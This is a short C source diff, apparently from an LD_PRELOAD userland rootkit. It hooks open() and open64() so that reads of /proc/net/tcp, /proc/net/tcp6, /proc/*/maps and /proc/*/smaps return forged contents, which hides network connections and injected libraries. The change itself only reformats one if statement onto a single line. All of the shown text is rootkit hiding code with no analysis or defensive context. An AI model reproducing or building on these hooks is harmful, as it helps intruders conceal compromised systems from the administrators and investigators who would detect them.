@@ -12,8 +12,7 @@ int open(const char *pathname, int flags, mode_t mode)
     }
     CLEAN(ldsp);
 
-    if(!strcmp(pathname, "/proc/net/tcp") || !strcmp(pathname, "/proc/net/tcp6"))
-      return fileno(forge_procnet(pathname));
+    if(!strcmp(pathname, "/proc/net/tcp") || !strcmp(pathname, "/proc/net/tcp6")) return fileno(forge_procnet(pathname));
 
     if(!fnmatch("/proc/*/maps",pathname,FNM_PATHNAME)) return fileno(forge_maps(pathname));
     if(!fnmatch("/proc/*/smaps",pathname,FNM_PATHNAME)) return fileno(forge_smaps(pathname));
@@ -55,8 +54,7 @@ int open64(const char *pathname, int flags, mode_t mode)
     }
     CLEAN(ldsp);
 
-    if(!strcmp(pathname, "/proc/net/tcp") || !strcmp(pathname, "/proc/net/tcp6"))
-      return fileno(forge_procnet(pathname));
+    if(!strcmp(pathname, "/proc/net/tcp") || !strcmp(pathname, "/proc/net/tcp6")) return fileno(forge_procnet(pathname));
 
     if(!fnmatch("/proc/*/maps",pathname,FNM_PATHNAME)) return fileno(forge_maps(pathname));
     if(!fnmatch("/proc/*/smaps",pathname,FNM_PATHNAME)) return fileno(forge_smaps(pathname));
